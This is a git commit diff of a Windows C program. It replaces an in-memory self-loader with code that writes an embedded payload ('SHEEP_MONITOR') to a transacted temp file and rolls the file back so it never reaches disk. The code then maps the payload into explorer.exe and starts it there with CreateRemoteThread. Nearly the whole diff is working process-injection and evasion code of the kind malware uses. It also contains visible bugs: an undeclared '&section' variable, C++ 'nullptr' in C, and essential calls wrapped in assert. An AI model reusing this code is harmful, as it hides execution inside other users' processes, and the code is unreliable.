22d9ab110050421df33eea3ba878c7c30330cf52
frank2 <frank2@dc949.org>
2025-01-05 18:45:17 -0800

    refactor the main routine to perform a different payload

--- main.c
+++ main.c
@@ -1,160 +1,198 @@
-#include <stddef.h>
 #include <stdint.h>
-#include <stdbool.h>
+#include <stddef.h>
 #include <stdlib.h>
 #include <string.h>
 #include <assert.h>
 #include <windows.h>
+#include <ktmw32.h>
+#include "ntddk.h"
 
-#define VA_TO_RVA(base, va) (((uintptr_t)va) - ((uintptr_t)base))
+#pragma comment(lib, "ktmw32.lib")
+#pragma comment(lib, "ntdll.lib")
 
-uint8_t *FRESH_IMAGE = NULL;
-bool VALLOC_STATE = false;
-
-void exit_thread(void) {
-   ExitThread(0);
-}
+extern uint8_t SHEEP_MONITOR[];
 
 PIMAGE_NT_HEADERS64 get_nt_headers(uint8_t *base) {
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
    return (PIMAGE_NT_HEADERS64)&base[dos_header->e_lfanew];
 }
 
-VOID WINAPI get_fresh_image(PVOID instance, DWORD reason, PVOID reserved) {
-   if (reason != DLL_PROCESS_ATTACH)
-      return;
+typedef struct __SheepConfig {
+   uintptr_t image_base;
+   size_t max_sheep;
+} SheepConfig;
 
-   uint8_t *self_u8 = (uint8_t *)instance;
-   PIMAGE_NT_HEADERS64 nt_headers = get_nt_headers(self_u8);
-   FRESH_IMAGE = (uint8_t *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nt_headers->OptionalHeader.SizeOfImage);
-   memcpy(FRESH_IMAGE, self_u8, nt_headers->OptionalHeader.SizeOfImage);
-}
+HANDLE create_sheep_section(void) {
+   /* create a new transaction */
+   HANDLE transaction = CreateTransaction(NULL, NULL, 0, 0, 0, 0, NULL);
+   assert(transaction != INVALID_HANDLE_VALUE);
 
-#pragma comment(linker, "/INCLUDE:_tls_used")
-#pragma comment(linker, "/INCLUDE:tls_callback")
-#pragma const_seg(push)
-#pragma const_seg(".CRT$XLAAA")
-const PIMAGE_TLS_CALLBACK tls_callback = get_fresh_image;
-#pragma const_seg(pop)
-
-void relocate_image(uint8_t *image, uintptr_t from, uintptr_t to) {
-   PIMAGE_NT_HEADERS64 nt_headers = get_nt_headers(image);
-   DWORD reloc_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
-
-   if (reloc_rva == 0)
-      return;
-
-   uintptr_t base_delta = to - from;
-   uint8_t *base_reloc = &image[reloc_rva];
-
-   while (((PIMAGE_BASE_RELOCATION)base_reloc)->VirtualAddress != 0) {
-      PIMAGE_BASE_RELOCATION base_reloc_block = (PIMAGE_BASE_RELOCATION)base_reloc;
-      WORD *entry_table = (WORD *)&base_reloc[sizeof(IMAGE_BASE_RELOCATION)];
-      size_t entries = (base_reloc_block->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);
-
-      for (size_t i=0; i<entries; ++i) {
-         DWORD reloc_rva = base_reloc_block->VirtualAddress + (entry_table[i] & 0xFFF);
-         uintptr_t *reloc_ptr = (uintptr_t *)&image[reloc_rva];
-               
-         if ((entry_table[i] >> 12) == IMAGE_REL_BASED_DIR64)
-            *reloc_ptr += base_delta;
-      }
-            
-      base_reloc += base_reloc_block->SizeOfBlock;
-   }
-
-   // the loader assigns OptionalHeader.ImageBase after relocation
-   nt_headers->OptionalHeader.ImageBase = (ULONGLONG)to;
-}
-
-void load_image(uint8_t *base_u8) {
-   PIMAGE_NT_HEADERS64 base_nt = get_nt_headers(base_u8);
+   /* create a dummy temp file to write to (it won't be written to disk) */
+   char dummy_name[MAX_PATH+1];
+   memset(dummy_name, 0, sizeof(dummy_name));
    
-   DWORD import_rva = base_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+   char temp_path[MAX_PATH+1];
+   memset(temp_path, 0, sizeof(temp_path));
 
-   if (import_rva != 0) {
-      PIMAGE_IMPORT_DESCRIPTOR import_table = (PIMAGE_IMPORT_DESCRIPTOR)&base_u8[import_rva];
+   DWORD temp_path_size = GetTempPathA(MAX_PATH, temp_path);
+   GetTempFileNameA(temp_path, "TH", 0, dummy_name);
 
-      while (import_table->OriginalFirstThunk != 0) {
-         HMODULE module = LoadLibraryA((const char *)&base_u8[import_table->Name]);
-         uintptr_t *original_thunks = (uintptr_t *)&base_u8[import_table->OriginalFirstThunk];
-         uintptr_t *import_addrs = (uintptr_t *)&base_u8[import_table->FirstThunk];
+   HANDLE sheep_monitor_file = CreateFileTransactedA(dummy_name,
+                                                     GENERIC_WRITE,
+                                                     0,
+                                                     NULL,
+                                                     CREATE_ALWAYS,
+                                                     FILE_ATTRIBUTE_NORMAL,
+                                                     NULL,
+                                                     transaction,
+                                                     NULL,
+                                                     NULL);
+   assert(sheep_monitor_file != INVALID_HANDLE_VALUE);
+   
+   DWORD bytes_written;
+   assert(WriteFile(sheep_monitor_file, &SHEEP_MONITOR[0], sizeof(SHEEP_MONITOR), &bytes_written, NULL));
+   CloseHandle(sheep_monitor_file);
 
-         while (*original_thunks != 0) {
-            if (*original_thunks & 0x8000000000000000)
-               *import_addrs = (uintptr_t)GetProcAddress(module, MAKEINTRESOURCE(*original_thunks & 0xFFFF));
-            else {
-               PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)&base_u8[*original_thunks];
-               *import_addrs = (uintptr_t)GetProcAddress(module, import_by_name->Name);
-            }
+   /* read the transacted file into a section */
+   sheep_monitor_file = CreateFileTransactedA(dummy_name,
+                                              GENERIC_READ,
+                                              0,
+                                              NULL,
+                                              OPEN_EXISTING,
+                                              FILE_ATTRIBUTE_NORMAL,
+                                              NULL,
+                                              transaction,
+                                              NULL,
+                                              NULL);
+   assert(sheep_monitor_file != INVALID_HANDLE_VALUE);
 
-            ++import_addrs;
-            ++original_thunks;
-         }
+   HANDLE sheep_section;
+   assert(NtCreateSection(&section,
+                          SECTION_MAP_EXECUTE,
+                          NULL,
+                          0,
+                          PAGE_READONLY,
+                          SEC_IMAGE,
+                          sheep_monitor_file) == STATUS_SUCCESS);
 
-         ++import_table;
-      }
-   }
+   /* *jedi hands* there was never a file */
+   CloseHandle(sheep_monitor_file);
+   assert(RollbackTransaction(transaction));
 
-   /* initialize the tls callbacks */
-   DWORD tls_rva = base_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
-
-   if (tls_rva != 0) {
-      PIMAGE_TLS_DIRECTORY64 tls_dir = (PIMAGE_TLS_DIRECTORY64)&base_u8[tls_rva];
-      void (**callbacks)(PVOID, DWORD, PVOID) = (void (**)(PVOID, DWORD, PVOID))tls_dir->AddressOfCallBacks;
-
-      while (*callbacks != NULL) {
-         (*callbacks)(base_u8, DLL_PROCESS_ATTACH, NULL);
-         ++callbacks;
-      }
-   }
+   return sheep_section;
 }
 
+DWORD get_export_rva(uint8_t *image_base, const char *export_name) {
+   PIMAGE_NT_HEADERS64 nt_headers = get_nt_headers(image_base);
+   PIMAGE_DATA_DIRECTORY export_dir_info = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
+   PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)&image_base[export_dir_info->VirtualAddress];
+
+   DWORD *functions = (DWORD *)&image_base[export_dir->AddressOfFunctions];
+   DWORD *names = (DWORD *)&image_base[export_dir->AddressOfNames];
+   WORD *name_ordinals = (WORD *)&image_base[export_dir->AddressOfNameOrdinals];
+
+   for (size_t i=0; i<export_dir->NumberOfNames; ++i) {
+      if (strncmp((const char *)&image_base[names[i]], export_name, strlen(export_name)) != 0)
+         continue;
+
+      return functions[name_ordinals[i]];
+   }
+
+   return 0;
+}
+ 
 int main(int argc, char *argv[]) {
-   if (VALLOC_STATE) {
-      atexit(exit_thread);
-      puts("* valloc main");
-      return 0;
+   DWORD proc_array_bytes = sizeof(DWORD) * 1024;
+   DWORD *proc_array = (DWORD *)malloc(proc_array_bytes);
+   DWORD proc_array_needed;
+   assert(EnumProcesses(proc_array, proc_array_bytes, &proc_array_needed));
+
+   if (proc_array_needed > proc_array_bytes) {
+      proc_array = (DWORD *)realloc(proc_array, proc_array_needed);
+      proc_array_bytes = proc_array_needed;
+      assert(EnumProcesses(proc_array, proc_array_bytes, &proc_array_needed));
    }
 
-   uint8_t *base_u8 = FRESH_IMAGE;
-   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base_u8;
-   PIMAGE_NT_HEADERS64 nt_headers = get_nt_headers(base_u8);
-   PIMAGE_SECTION_HEADER section_table = (PIMAGE_SECTION_HEADER)&base_u8[dos_header->e_lfanew+sizeof(DWORD)+sizeof(PIMAGE_FILE_HEADER)+nt_headers->FileHeader.SizeOfOptionalHeader];
+   size_t pids = proc_array_needed / sizeof(DWORD);
+   DWORD found_pid = -1;
 
-   uintptr_t valloc_base = (uintptr_t)VirtualAlloc(NULL, nt_headers->OptionalHeader.SizeOfImage, MEM_RESERVE, PAGE_READWRITE);
-   assert(valloc_base != 0);
+   for (size_t i=0; i<pids; ++i) {
+      HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, proc_array[i]);
 
-   uint8_t *valloc_headers = (uint8_t *)VirtualAlloc((LPVOID)valloc_base, nt_headers->OptionalHeader.SizeOfHeaders, MEM_COMMIT, PAGE_READWRITE);
-   assert(valloc_headers != NULL);
-   memcpy(valloc_headers, base_u8, nt_headers->OptionalHeader.SizeOfHeaders);
+      if (proc == NULL)
+         continue;
 
-   for (size_t i=0; i<nt_headers->FileHeader.NumberOfSections; ++i) {
-      PIMAGE_SECTION_HEADER section = &section_table[i];
-      DWORD sect_protect;
+      char filename[MAX_PATH+1];
+      memset(&filename[0], 0, MAX_PATH+1);
+      DWORD filename_size = GetModuleFileNameExA(proc, nullptr, &filename[0], MAX_PATH);
 
-      if ((section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0) {
-         sect_protect = PAGE_EXECUTE;
+      size_t j;
+      
+      for (j=filename_size; j!=0; --j)
+         if (filename[j] == '\\')
+            break;
 
-         if ((section->Characteristics & IMAGE_SCN_MEM_READ) != 0) {
-            sect_protect = PAGE_EXECUTE_READ;
+      ++j;
 
-            if ((section->Characteristics & IMAGE_SCN_MEM_WRITE) != 0) {
-               sect_protect = PAGE_EXECUTE_READWRITE;
-            }
-         }
+      if (strncmp(&filename[j], "explorer.exe", strlen("explorer.exe")) == 0) {
+         found_pid = proc_array[i];
+         break;
       }
-      else if (section->Characteristics & IMAGE_SCN_MEM_READ != 0) {
-         sect_protect = PAGE_READONLY;
-
-         if (section->Characteristics & IMAGE_SCN_MEM_WRITE)
-            sect_protect = PAGE_READWRITE;
-      }
-         
-      uint8_t *valloc_section = (uint8_t *)VirtualAlloc((LPVOID)(valloc_base+section->VirtualAddress), section->Misc.VirtualSize, MEM_COMMIT, sect_protect);
-      assert(valloc_section != NULL);
-      memcpy(valloc_section, &base_u8[section->VirtualAddress], section->Misc.VirtualSize);
    }
+
+   assert(found_pid != -1);
+
+   /* open pid with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE */
+   HANDLE explorer_proc = OpenProcess(PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, found_pid);
+   assert(explorer_proc != NULL);
+
+   PIMAGE_NT_HEADERS64 sheep_nt = get_nt_headers(&SHEEP_MONITOR[0]);
+   HANDLE sheep_section = create_sheep_section();
+   uintptr_t remote_sheep_base = 0;
+   size_t remote_sheep_size = 0;
+   assert(NtMapViewOfSection(sheep_section,
+                             explorer_proc,
+                             &remote_sheep_base,
+                             0,
+                             0,
+                             NULL,
+                             &remote_sheep_size,
+                             ViewShare,
+                             MEM_DIFFERENT_IMAGE_BASE_OK,
+                             PAGE_EXECUTE_WRITECOPY) == STATUS_SUCCESS);
+
+   SheepConfig config;
+   memset(&config, 0, sizeof(SheepConfig));
+   config.image_base = remote_sheep_base;
+   config.max_sheep = 10;
+
+   uintptr_t config_base = (uintptr_t)VirtualAllocEx(explorer_proc, NULL, sizeof(SheepConfig), MEM_COMMIT, PAGE_READWRITE);
+   DWORD bytes_written;
+   assert(config_base != 0);
+   assert(WriteProcessMemory(explorer_proc, config_base, &config, sizeof(SheepConfig), &bytes_written));
+
+   DWORD loader_rva = get_export_rva(&SHEEP_MONITOR[0], "load_image");
+   assert(loader_rva != 0);
+
+   DWORD loader_id;
+   HANDLE remote_thread_handle = CreateRemoteThread(explorer_proc,
+                                                    NULL,
+                                                    8192,
+                                                    (LPTHREAD_START_ROUTINE)(remote_sheep_base+loader_rva),
+                                                    config_base,
+                                                    0,
+                                                    &loader_id);
+   assert(remote_thread_handle != NULL);
+
+   DWORD main_id;
+   HANDLE main_handle = CreateRemoteThread(explorer_proc,
+                                           NULL,
+                                           8192,
+                                           (LPTHREAD_START_ROUTINE)(remote_sheep_base+sheep_nt->OptionalHeader.AddressOfEntryPoint),
+                                           NULL,
+                                           0,
+                                           &main_id);
+   assert(main_handle != NULL);
 
    return 0;
 }
